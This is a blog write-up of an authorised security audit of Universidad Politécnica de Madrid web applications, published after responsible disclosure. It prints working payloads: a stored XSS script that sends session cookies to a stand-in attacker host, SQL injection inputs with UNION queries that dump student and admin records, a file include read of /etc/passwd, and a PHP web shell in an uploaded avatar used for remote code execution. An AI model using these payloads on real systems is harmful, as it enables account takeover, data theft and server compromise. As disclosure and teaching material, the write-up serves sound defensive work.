---
title: "A University Web Audit"
keywords: "default creds, sqli, lfr, rce, xss, blind-xss, university, web security, account takeover"
date: 2025-10-06
lastmod: 2025-10-06
categories: [Security, Web-Security]
tags: [default-creds, sqli, lfr, rce, xss, blind-xss, university, web-security, account-takeover]
toc: true
math: false
mermaid: true
---




During my final degree project, I audited several web applications from my university, the [Universidad Politécnica de Madrid](https://www.upm.es/){:target="_blank"}, and identified hundreds of vulnerabilities, many of which had a critical impact. In this post, I will analyze some of the most interesting findings.


![](../assets/img/upm-vulnerabilities/logo.png)


> The complete write-up, along with much more context about the applications and vulnerabilities, can be read [here](https://oa.upm.es/90101/1/TFG_JORGE_CEREZO_DACOSTA.pdf){:target="_blank"} (although it is in Spanish).




## Stealing Teachers' Accounts via Blind XSS


In one of the applications, there are activities where students can submit free-form text that teachers will later review and grade.


These submissions were stored without sanitization in the database and rendered in the teacher’s panel without any output validation. This allowed any student to inject and execute JavaScript code in the teacher’s browser (i.e., via `<script>` tags) when they inevitably viewed the submission.


As the session cookie did not have the `HttpOnly` attribute, it could be obtained and exfiltrated using JavaScript (`document.cookie`). So, a submission with the following content could have been used to steal teachers’ accounts by exfiltrating their session cookie to the attacker’s server:


```html
<script>
  fetch('https://attacker.poc/?cookie='+encodeURIComponent(document.cookie))
</script>
```


```mermaid
sequenceDiagram
    autonumber
    participant ST as Student
    participant APP as Web App
    participant TA as Teacher


    ST->>APP: Submits malicious answer
    APP->>APP: Store payload without<br/>sanitization in the DB
    TA->>APP: Opens grading page
    APP-->>TA: Renders submission
    Note over TA: Script executes in<br/>teacher's browser
    TA-->>ST: JavaScript code exfiltrates the teacher's<br/>session cookie to the student's endpoint
    ST->>APP: Set stolen cookie<br/>and access teacher's account
```



## SQL Injections Everywhere


Multiple SQL injections were found; most parts of the application that used a GET or POST parameter for database operations did so insecurely.


One case stood out, as it was one of the few with some sort of validation.


It was present in a form used to query a student’s group identifier using their enrollment number and national ID, with the following validations:
* The national ID had both single and double quotes removed.
* The enrollment number length was enforced to be exactly 6 characters.


The server used the following query:


```sql
SELECT g.groupNumber
FROM group g
INNER JOIN student_has_group ag ON ag.groupId_ag = g.groupId
INNER JOIN student a ON a.studentId = ag.studentId_ag
INNER JOIN group_has_course gc ON g.groupId = gc.groupId_gc
WHERE gc.courseId_gc = '$courseId'
  AND a.enrollmentNumber = '$enrollmentNumber'
  AND a.nationalId = '$searchNationalId'
  AND g.enroll_group = 1
GROUP BY groupNumber DESC
```


The validation might appear sufficient; however, the following values for national ID and enrollment number, respectively, still satisfied those constraints.


- `=2 OR 1=1-- -`
- `'OR ''`


Generating a query like the following:


```sql
SELECT g.groupNumber
FROM group g
INNER JOIN student_has_group ag ON ag.groupId_ag = g.groupId
INNER JOIN student a ON a.studentId = ag.studentId_ag
INNER JOIN group_has_course gc ON g.groupId = gc.groupId_gc
WHERE gc.courseId_gc = '$courseId'
  AND a.enrollmentNumber='' OR ''' AND a.nationalId='=2 OR 1=1-- -'
  AND g.enroll_group=1
GROUP BY groupNumber DESC
```


Because the injection occurs in the enrollment number, it injects an "OR" operator whose effective contents become `'' AND a.nationalId=` due to SQL’s quote-doubling escape, allowing arbitrary SQL to be injected in the national ID position without using quotes in that field.


From here, UNION-based extraction recovered data for any student or even administrator account.


For example, the following national ID and enrollment number values returned complete student records:



```mermaid
%%{init: { "flowchart": { "wrappingWidth": 360 } }}%%
flowchart TD
    B["enrollment number</br></br>*'OR ''*"] --> D["length==6  ✅"]
    C["National ID</br></br>*=2 UNION SELECT CONCAT(STUDENTID, CHAR(32), STUDENTNAME, CHAR(32), nationalId, CHAR(32), ENROLLMENTNUMBER, CHAR(32), SURNAME, CHAR(32), EMAIL, CHAR(32), GROUP) FROM STUDENT WHERE STUDENTID = 10425-- -*"] --> E["quotes removed  ✅"]
    D --> G["UNION SELECT from STUDENT executes"]
    E --> G["UNION SELECT from STUDENT executes"]
    G --> H["**Group identifier lookup response:**</br></br>Student with National ID/Passport:</br>*=2 UNION SELECT CONCAT(STUDENTID, CHAR(32), STUDENTNAME, CHAR(32), nationalId, CHAR(32), ENROLLMENTNUMBER, CHAR(32), SURNAME, CHAR(32), EMAIL, CHAR(32), GROUP) FROM STUDENT WHERE STUDENTID = 10425-- -* </br></br>and with enrollment number:</br>*'OR ''* </br></br>is assigned the group number:</br><mark>10425 José Luis 33333333 000449 Fuertes Castro admin\@fi.upm.es G-553T</mark>"]
```


Similarly, administrator data could be extracted:


```mermaid
%%{init: { "flowchart": { "wrappingWidth": 360 } }}%%
flowchart TD
    B["enrollment number</br></br>*'OR ''*"] --> D["length==6  ✅"]
    C["National ID</br></br>*=2 UNION SELECT CONCAT(ADMINID, CHAR(32), ADMINNAME, CHAR(32), SURNAMEADM, CHAR(32), USER, CHAR(32), PASSWORD, CHAR(32), EMAIL, CHAR(32), ADMIN) FROM ADMINISTRATOR-- -*"] --> E["quotes removed  ✅"]
    D --> G["UNION SELECT from ADMINISTRATOR executes"]
    E --> G["UNION SELECT from ADMINISTRATOR executes"]
    G --> H["**Group identifier lookup response:**</br></br>Student with National ID/Passport:</br>*=2 UNION SELECT CONCAT(ADMINID, CHAR(32), ADMINNAME, CHAR(32), SURNAMEADM, CHAR(32), USER, CHAR(32), PASSWORD, CHAR(32), EMAIL, CHAR(32), ADMIN) FROM ADMINISTRATOR-- -*</br></br>and with enrollment number:</br>*'OR ''*</br></br>is assigned the group number:</br><mark>10 admin admin admin $1$aE4.badsb78...5c1 admin\@fi.upm.es 1</mark>"]
```



## Weak Credentials in the Admin Portal


The admin portal managing all audited applications was protected by weak credentials, such as `admin:admin`.


This could have allowed an external attacker to take control of the data across all applications.


## Remote Code Execution via Local File Read


While reviewing the code of one of the applications, a PHP file containing the following code caught my attention:


```php
<body>
<div id="outer">
  <div id="header">
    <?php include "header.php" ?>
  </div>
  <div id="content">
    <?php include $_GET['view'] ?>
    <div class="clear"></div>
  </div>
  <?php include "footer.php" ?>
</div>
</body>
```


This file was part of the admin portal, yet it was accessible without any authentication.


In PHP, the `include` expression includes and evaluates the specified file.


As the value of the view parameter was taken directly from the user-controlled `$_GET` input, an external attacker would be able to load local files from the server.


```mermaid
sequenceDiagram
    autonumber
    participant C as Attacker
    participant S as UPM Server


    C->>S: GET /layout.php?view=/etc/passwd
    activate S
    S->>S: include $_GET["view"] → retrieve /etc/passwd
    S-->>C: 200 OK<br/>...<br/>root:x:0:0:root:/root:/bin/bash<br/>...
    deactivate S
```


Sensitive files with PII of hundreds of students were accessible, leaking names, national IDs, enrollment numbers, and more information dating back to 2016:


![Leaked Students](../assets/img/upm-vulnerabilities/alumnos.png)


> Later, it was discovered that those files were also being served publicly without any restrictions, so any user who knew or guessed their route could access them directly.


While LFR enables file access, any PHP embedded in the included file will also execute, turning the Local File Read into code execution if attacker-controlled content exists at a known path.


In another audited application, the profile picture upload feature stored images in predictable locations that were publicly accessible through user profiles. Although content-type checks prevented these images from executing PHP code when accessed directly, using the vulnerable view parameter to include them forced the server to interpret the file as PHP code.


So, after uploading the following avatar, which would be stored on the server at `/var/www/html/draco/images/avatares/104.jpg`:


```php
<?php echo system($_REQUEST["cmd"]);?>
```


Requesting the vulnerable `layout.php` file with `view=/var/www/html/draco/images/avatares/104.jpg` and `cmd=whoami` would execute the command `whoami` on the server and include its output in the response, demonstrating Remote Code Execution.


```mermaid
sequenceDiagram
    autonumber
    participant A as Attacker
    participant S as UPM Server


    A->>S: Upload avatar (104.jpg)<br/>Contains a PHP web shell
    activate S
    S->>S: Save to<br/>/var/www/html/draco/images/avatares/104.jpg
    deactivate S


    A->>S: GET /layout.php?view=<br/>/var/www/html/draco/images/avatares/104.jpg<br/>&cmd=whoami
    activate S
    S->>S: include(view) -> executed as PHP<br/>system(whoami)
    S-->>A: 200 OK<br/>...<br/>www-data<br/>...
    deactivate S
```


## Conclusion


I hope the different scenarios were interesting.


Thanks to the Universidad Politécnica de Madrid, and especially to my teacher, José Luis Fuertes Castro, for the opportunity and supporting a responsible disclosure process.


If you have any questions about any of the attacks, feel free to reach out.